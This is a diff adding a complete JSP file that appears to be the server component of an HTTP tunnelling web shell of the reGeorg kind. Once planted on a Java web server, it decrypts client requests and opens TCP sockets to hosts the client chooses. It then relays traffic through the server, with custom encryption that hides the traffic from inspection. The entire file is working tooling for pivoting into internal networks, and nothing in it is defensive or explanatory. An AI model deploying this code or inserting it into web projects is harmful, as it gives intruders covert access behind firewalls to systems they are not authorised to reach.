@@ -1,0 +1,359 @@
+<%@ page buffer="1kb" pageEncoding="ISO-8859-1" contentType="text/html;charset=ISO-8859-1" import="java.io.*,java.net.*,java.util.*,java.util.concurrent.*,java.util.concurrent.atomic.*,java.security.*,javax.crypto.*,javax.crypto.spec.*" %>
+<%!
+String KEY = "CHANGE_ME";
+static final AtomicLong ECTR = new AtomicLong(0);
+
+// arraycopy and time helpers (avoid System class for JDK17+JDT compat)
+void cp(byte[] s, int so, byte[] d, int dp, int l) { for(int i=0;i<l;i++) d[dp+i]=s[so+i]; }
+long time() { return new java.util.Date().getTime(); }
+
+String jStr(String json, String key) {
+    String q = "\"" + key + "\"";
+    int i = json.indexOf(q);
+    if (i < 0) return null;
+    i += q.length();
+    while (i < json.length() && json.charAt(i) != ':') i++;
+    if (i >= json.length()) return null;
+    i++;
+    while (i < json.length() && json.charAt(i) == ' ') i++;
+    if (i >= json.length()) return null;
+    if (json.charAt(i) == '"') {
+        StringBuilder sb = new StringBuilder(); i++;
+        while (i < json.length() && json.charAt(i) != '"') {
+            if (json.charAt(i) == '\\' && i + 1 < json.length()) { i++; sb.append(json.charAt(i)); }
+            else sb.append(json.charAt(i)); i++;
+        }
+        return sb.toString();
+    }
+    int s = i;
+    while (i < json.length() && ",} \t\r\n".indexOf(json.charAt(i)) < 0) i++;
+    return json.substring(s, i);
+}
+
+byte[][] dk(String key) throws Exception {
+    byte[] master = MessageDigest.getInstance("SHA-256").digest(key.getBytes("UTF-8"));
+    return new byte[][]{
+        MessageDigest.getInstance("SHA-256").digest(cat(master, "enc".getBytes("UTF-8"))),
+        MessageDigest.getInstance("SHA-256").digest(cat(master, "auth".getBytes("UTF-8")))
+    };
+}
+byte[] gks(byte[] ek, byte[] n, int len) throws Exception {
+    ByteArrayOutputStream s = new ByteArrayOutputStream(); int c = 0;
+    while (s.size() < len) {
+        MessageDigest md = MessageDigest.getInstance("SHA-256");
+        md.update(ek); md.update(n);
+        md.update(new byte[]{(byte)(c>>24),(byte)(c>>16),(byte)(c>>8),(byte)c});
+        byte[] h = md.digest(); int r = len - s.size();
+        s.write(h, 0, r > h.length ? h.length : r); c++;
+    }
+    return s.toByteArray();
+}
+byte[] ctag(byte[] ak, byte[] n, byte[] ct) throws Exception {
+    javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
+    mac.init(new SecretKeySpec(ak, "HmacSHA256")); mac.update(n); mac.update(ct);
+    byte[] h = mac.doFinal(); return Arrays.copyOf(h, 16);
+}
+byte[] dec(byte[] data, String key) {
+    try {
+        if (data.length < 28) return null;
+        byte[][] keys = dk(key); byte[] ek = keys[0], ak = keys[1];
+        byte[] n = Arrays.copyOfRange(data, 0, 12);
+        byte[] tag = Arrays.copyOfRange(data, data.length - 16, data.length);
+        byte[] ct = Arrays.copyOfRange(data, 12, data.length - 16);
+        if (!Arrays.equals(tag, ctag(ak, n, ct))) return null;
+        byte[] ks = gks(ek, n, ct.length); byte[] pt = new byte[ct.length];
+        for (int i = 0; i < ct.length; i++) pt[i] = (byte)(ct[i] ^ ks[i]);
+        return pt;
+    } catch (Exception e) { return null; }
+}
+byte[] enc(byte[] data, String key) {
+    try {
+        byte[][] keys = dk(key); byte[] ek = keys[0], ak = keys[1];
+        long ctr = ECTR.incrementAndGet();
+        MessageDigest md = MessageDigest.getInstance("SHA-256"); md.update(ek);
+        md.update(new byte[]{(byte)(ctr>>56),(byte)(ctr>>48),(byte)(ctr>>40),(byte)(ctr>>32),
+                             (byte)(ctr>>24),(byte)(ctr>>16),(byte)(ctr>>8),(byte)ctr});
+        byte[] iv = md.digest(); byte[] n = Arrays.copyOf(iv, 12);
+        byte[] ks = gks(ek, n, data.length); byte[] ct = new byte[data.length];
+        for (int i = 0; i < data.length; i++) ct[i] = (byte)(data[i] ^ ks[i]);
+        byte[] tag = ctag(ak, n, ct);
+        byte[] out = new byte[12 + ct.length + 16];
+        cp(n, 0, out, 0, 12); cp(ct, 0, out, 12, ct.length); cp(tag, 0, out, 12 + ct.length, 16);
+        return out;
+    } catch (Exception e) { return new byte[0]; }
+}
+
+byte[] cat(byte[] a, byte[] b) {
+    byte[] r = new byte[a.length + b.length];
+    cp(a, 0, r, 0, a.length); cp(b, 0, r, a.length, b.length); return r;
+}
+
+byte[] mkPkt(int flag, int sid, int seq, int ack, byte[] data) {
+    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+    try {
+        bos.write(flag);
+        bos.write((sid>>24)&0xFF); bos.write((sid>>16)&0xFF); bos.write((sid>>8)&0xFF); bos.write(sid&0xFF);
+        bos.write((seq>>24)&0xFF); bos.write((seq>>16)&0xFF); bos.write((seq>>8)&0xFF); bos.write(seq&0xFF);
+        bos.write((ack>>24)&0xFF); bos.write((ack>>16)&0xFF); bos.write((ack>>8)&0xFF); bos.write(ack&0xFF);
+        bos.write((data.length>>24)&0xFF); bos.write((data.length>>16)&0xFF);
+        bos.write((data.length>>8)&0xFF); bos.write(data.length&0xFF);
+        if (data.length > 0) bos.write(data);
+    } catch (Exception e) {} return bos.toByteArray();
+}
+
+int[] parseSyn(byte[] raw) {
+    try {
+        if (raw.length < 2) return null;
+        int cnt = ((raw[0]&0xFF)<<8)|(raw[1]&0xFF), off = 2;
+        for (int i = 0; i < cnt; i++) {
+            if (off + 17 > raw.length) break;
+            int flag = raw[off]&0xFF;
+            int sid = ((raw[off+1]&0xFF)<<24)|((raw[off+2]&0xFF)<<16)|((raw[off+3]&0xFF)<<8)|(raw[off+4]&0xFF);
+            int seq = ((raw[off+5]&0xFF)<<24)|((raw[off+6]&0xFF)<<16)|((raw[off+7]&0xFF)<<8)|(raw[off+8]&0xFF);
+            int dlen = ((raw[off+13]&0xFF)<<24)|((raw[off+14]&0xFF)<<16)|((raw[off+15]&0xFF)<<8)|(raw[off+16]&0xFF);
+            off += 17;
+            if ((flag & 0x0F) == 0x01) return new int[]{sid, seq};
+            off += dlen;
+        }
+    } catch (Exception e) {} return null;
+}
+
+byte[] parseSynData(byte[] raw) {
+    try {
+        if (raw.length < 2) return null;
+        int cnt = ((raw[0]&0xFF)<<8)|(raw[1]&0xFF), off = 2;
+        for (int i = 0; i < cnt; i++) {
+            if (off + 17 > raw.length) break;
+            int flag = raw[off]&0xFF;
+            int dlen = ((raw[off+13]&0xFF)<<24)|((raw[off+14]&0xFF)<<16)|((raw[off+15]&0xFF)<<8)|(raw[off+16]&0xFF);
+            off += 17; if (off + dlen > raw.length) break;
+            if ((flag & 0x0F) == 0x01) return Arrays.copyOfRange(raw, off, off + dlen);
+            off += dlen;
+        }
+    } catch (Exception e) {} return null;
+}
+
+Socket connectTarget(byte[] dd) {
+    try {
+        int hlen = dd[0]&0xFF; String host = new String(dd, 1, hlen);
+        int port = ((dd[1+hlen]&0xFF)<<8)|(dd[2+hlen]&0xFF);
+        Socket s = new Socket(); s.connect(new InetSocketAddress(host, port), 5000);
+        s.setTcpNoDelay(true); return s;
+    } catch (Exception e) { return null; }
+}
+
+@SuppressWarnings("unchecked")
+ConcurrentHashMap<Long, Socket> getSessions() {
+    ConcurrentHashMap<Long, Socket> m = (ConcurrentHashMap<Long, Socket>) getServletContext().getAttribute("ysockSessions");
+    if (m == null) { m = new ConcurrentHashMap<>(); getServletContext().setAttribute("ysockSessions", m); } return m;
+}
+@SuppressWarnings("unchecked")
+ConcurrentHashMap<String, LinkedBlockingQueue<byte[]>> getQueues() {
+    ConcurrentHashMap<String, LinkedBlockingQueue<byte[]>> m = (ConcurrentHashMap<String, LinkedBlockingQueue<byte[]>>) getServletContext().getAttribute("ysockQueues");
+    if (m == null) { m = new ConcurrentHashMap<>(); getServletContext().setAttribute("ysockQueues", m); } return m;
+}
+@SuppressWarnings("unchecked")
+ConcurrentHashMap<String, Boolean> getCloseFlags() {
+    ConcurrentHashMap<String, Boolean> m = (ConcurrentHashMap<String, Boolean>) getServletContext().getAttribute("ysockCloseFlags");
+    if (m == null) { m = new ConcurrentHashMap<>(); getServletContext().setAttribute("ysockCloseFlags", m); } return m;
+}
+
+void writeFrame(JspWriter jw, int typeByte, byte[] data) throws Exception {
+    byte[] payload = new byte[1 + data.length]; payload[0] = (byte) typeByte;
+    cp(data, 0, payload, 1, data.length);
+    byte[] encrypted = enc(payload, KEY);
+    byte[] lenBuf = new byte[]{(byte)((encrypted.length>>24)&0xFF),(byte)((encrypted.length>>16)&0xFF),
+        (byte)((encrypted.length>>8)&0xFF),(byte)(encrypted.length&0xFF)};
+    jw.write(new String(lenBuf, "ISO-8859-1"));
+    jw.write(new String(encrypted, "ISO-8859-1"));
+    jw.flush();
+}
+
+void classicReadLoop(long sid, Socket sock) {
+    ConcurrentHashMap<String, LinkedBlockingQueue<byte[]>> queues = getQueues();
+    byte[] buf = new byte[65536];
+    try {
+        InputStream is = sock.getInputStream();
+        while (!sock.isClosed() && !getCloseFlags().containsKey("c_" + sid)) {
+            int n = is.read(buf); if (n == -1) break;
+            byte[] chunk = Arrays.copyOf(buf, n);
+            LinkedBlockingQueue<byte[]> rq = queues.get("r_" + sid);
+            if (rq != null) rq.offer(chunk);
+        }
+    } catch (Exception e) {}
+    finally {
+        LinkedBlockingQueue<byte[]> rq = queues.get("r_" + sid);
+        if (rq != null) rq.offer(new byte[0]);
+        try { sock.close(); } catch (Exception e) {}
+        getSessions().remove(sid);
+    }
+}
+
+void halfDuplexReadLoop(int sid, Socket sock, JspWriter jw,
+                        ConcurrentHashMap<String, Boolean> closeFlags) {
+    byte[] buf = new byte[65536];
+    try {
+        InputStream is = sock.getInputStream();
+        while (!sock.isClosed() && !closeFlags.containsKey("c_" + sid)) {
+            int n = is.read(buf); if (n == -1) break;
+            byte[] chunk = Arrays.copyOf(buf, n);
+            synchronized (jw) { writeFrame(jw, 0x01, chunk); }
+        }
+    } catch (Exception e) {}
+    finally {
+        try { synchronized (jw) { writeFrame(jw, 0x02, new byte[0]); } } catch (Exception e) {}
+        closeFlags.put("c_" + sid, true);
+        try { sock.close(); } catch (Exception e) {}
+    }
+}
+
+String b64e(byte[] b) { return java.util.Base64.getEncoder().encodeToString(b); }
+byte[] b64d(String s) { return java.util.Base64.getDecoder().decode(s); }
+%><%
+out.clear();
+
+StringBuilder sb = new StringBuilder();
+BufferedReader br = request.getReader();
+char[] cbuf = new char[8192]; int rn;
+while ((rn = br.read(cbuf)) != -1) sb.append(cbuf, 0, rn);
+String body = sb.toString();
+if (body.isEmpty()) { out.print("{\"d\":\"\"}"); return; }
+
+String action = jStr(body, "a");
+if (action == null) { out.print("{\"d\":\"\"}"); return; }
+
+try {
+if ("h".equals(action)) {
+    String rd = jStr(body, "d");
+    if (rd == null) { out.print("{\"d\":\"\",\"m\":3}"); return; }
+    byte[] raw = dec(b64d(rd), KEY);
+    if (raw == null) { out.print("{\"d\":\"\",\"m\":3}"); return; }
+    out.print("{\"d\":\"" + b64e(enc(raw, KEY)) + "\",\"m\":2}"); return;
+}
+if ("c".equals(action)) {
+    String rd = jStr(body, "d");
+    if (rd == null) { out.print("{\"d\":\"\"}"); return; }
+    byte[] raw = dec(b64d(rd), KEY);
+    if (raw == null || raw.length < 2) { out.print("{\"d\":\"\"}"); return; }
+    byte[] synData = parseSynData(raw);
+    int[] synInfo = parseSyn(raw);
+    if (synData == null || synInfo == null) { out.print("{\"d\":\"\"}"); return; }
+    final int sid = synInfo[0]; final int seq = synInfo[1];
+    Socket sock = connectTarget(synData);
+    if (sock == null) {
+        ByteArrayOutputStream fb = new ByteArrayOutputStream();
+        fb.write(0); fb.write(1); fb.write(mkPkt(0x00, sid, 0, seq, new byte[0]));
+        out.print("{\"d\":\"" + b64e(enc(fb.toByteArray(), KEY)) + "\"}"); return;
+    }
+    getSessions().put((long)sid, sock);
+    final ConcurrentHashMap<String, Boolean> closeFlags = getCloseFlags();
+    final ConcurrentHashMap<String, LinkedBlockingQueue<byte[]>> queues = getQueues();
+    final LinkedBlockingQueue<byte[]> wq = new LinkedBlockingQueue<>();
+    queues.put("w_" + sid, wq);
+
+    response.setContentType("application/octet-stream");
+    response.setHeader("X-Accel-Buffering", "no");
+    response.setHeader("Cache-Control", "no-cache");
+    writeFrame(out, 0x00, new byte[0]);
+
+    final JspWriter fout = out;
+    final Socket fsock = sock;
+    new Thread(new Runnable() { public void run() { halfDuplexReadLoop(sid, fsock, fout, closeFlags); } }).start();
+
+    long lastActivity = time();
+    while (true) {
+        if (closeFlags.containsKey("c_" + sid)) break;
+        byte[] wd = wq.poll(200, TimeUnit.MILLISECONDS);
+        if (wd != null && wd.length > 0) {
+            try { sock.getOutputStream().write(wd); lastActivity = time(); }
+            catch (Exception e) { break; }
+        }
+        if (sock.isClosed()) break;
+        if (time() - lastActivity > 300000) { try { sock.close(); } catch (Exception e) {} break; }
+    }
+    closeFlags.remove("c_" + sid); queues.remove("w_" + sid); getSessions().remove((long)sid); return;
+}
+if ("d".equals(action)) {
+    String idStr = jStr(body, "id"); String rd = jStr(body, "d");
+    if (idStr == null || rd == null) { out.print("{\"ok\":false}"); return; }
+    long sid = Long.parseLong(idStr);
+    byte[] raw = dec(b64d(rd), KEY);
+    if (raw == null) { out.print("{\"ok\":false}"); return; }
+    LinkedBlockingQueue<byte[]> wq = getQueues().get("w_" + sid);
+    if (wq == null) { out.print("{\"ok\":false}"); return; }
+    wq.offer(raw); out.print("{\"ok\":true}"); return;
+}
+if ("x".equals(action)) {
+    String idStr = jStr(body, "id");
+    if (idStr == null) { out.print("{\"ok\":false}"); return; }
+    long sid = Long.parseLong(idStr);
+    getCloseFlags().put("c_" + sid, true);
+    out.print("{\"ok\":true}"); return;
+}
+if ("cc".equals(action)) {
+    String rd = jStr(body, "d");
+    if (rd == null) { out.print("{\"d\":\"\"}"); return; }
+    byte[] raw = dec(b64d(rd), KEY);
+    if (raw == null || raw.length < 2) { out.print("{\"d\":\"\"}"); return; }
+    byte[] synData = parseSynData(raw);
+    int[] synInfo = parseSyn(raw);
+    if (synData == null || synInfo == null) { out.print("{\"d\":\"\"}"); return; }
+    final int sid = synInfo[0]; final int seq = synInfo[1];
+    Socket sock = connectTarget(synData);
+    if (sock == null) {
+        ByteArrayOutputStream fb = new ByteArrayOutputStream();
+        fb.write(0); fb.write(1); fb.write(mkPkt(0x00, sid, 0, seq, new byte[0]));
+        out.print("{\"d\":\"" + b64e(enc(fb.toByteArray(), KEY)) + "\"}"); return;
+    }
+    getSessions().put((long)sid, sock);
+    ConcurrentHashMap<String, LinkedBlockingQueue<byte[]>> queues = getQueues();
+    queues.put("r_" + sid, new LinkedBlockingQueue<byte[]>());
+    queues.put("w_" + sid, new LinkedBlockingQueue<byte[]>());
+    ByteArrayOutputStream fb = new ByteArrayOutputStream();
+    fb.write(0); fb.write(1); fb.write(mkPkt(0x04, sid, 0, seq, new byte[0]));
+    out.print("{\"d\":\"" + b64e(enc(fb.toByteArray(), KEY)) + "\",\"id\":\"" + sid + "\"}");
+    final Socket fsock = sock;
+    new Thread(new Runnable() { public void run() { classicReadLoop(sid, fsock); } }).start();
+    return;
+}
+if ("cp".equals(action)) {
+    String idStr = jStr(body, "id"); String rd = jStr(body, "d");
+    long sid = 0;
+    if (idStr != null && !idStr.isEmpty()) sid = Long.parseLong(idStr);
+    if (rd != null && !rd.isEmpty() && sid > 0) {
+        byte[] raw = dec(b64d(rd), KEY);
+        if (raw != null) {
+            Socket sock = getSessions().get(sid);
+            if (sock != null && !sock.isClosed()) {
+                try { sock.getOutputStream().write(raw); } catch (Exception e) { getSessions().remove(sid); }
+            }
+        }
+    }
+    if (sid > 0) {
+        ConcurrentHashMap<String, LinkedBlockingQueue<byte[]>> queues = getQueues();
+        LinkedBlockingQueue<byte[]> rq = queues.get("r_" + sid);
+        ByteArrayOutputStream db = new ByteArrayOutputStream(); boolean fin = false;
+        if (rq != null) {
+            byte[] chunk; while ((chunk = rq.poll()) != null) {
+                if (chunk.length == 0) { fin = true; break; } db.write(chunk);
+            }
+        }
+        byte[] rd2 = db.toByteArray();
+        Socket sock = getSessions().get(sid);
+        if (sock == null || sock.isClosed()) fin = true;
+        if (rd2.length > 0) {
+            ByteArrayOutputStream fb2 = new ByteArrayOutputStream();
+            fb2.write(0); fb2.write(1); fb2.write(mkPkt(0x02, (int)sid, 0, 0, rd2));
+            out.print("{\"d\":\"" + b64e(enc(fb2.toByteArray(), KEY)) + "\",\"fin\":" + fin + "}");
+        } else if (fin) {
+            ByteArrayOutputStream fb2 = new ByteArrayOutputStream();
+            fb2.write(0); fb2.write(1); fb2.write(mkPkt(0x08, (int)sid, 0, 0, new byte[0]));
+            out.print("{\"d\":\"" + b64e(enc(fb2.toByteArray(), KEY)) + "\",\"fin\":true}");
+        } else { out.print("{\"d\":\"\",\"fin\":false}"); }
+        return;
+    }
+    out.print("{\"d\":\"\",\"fin\":false}"); return;
+}
+out.print("{\"d\":\"\"}");
+} catch (Exception e) { try { out.print("{\"d\":\"\"}"); } catch (Exception ex) {} }
+%>
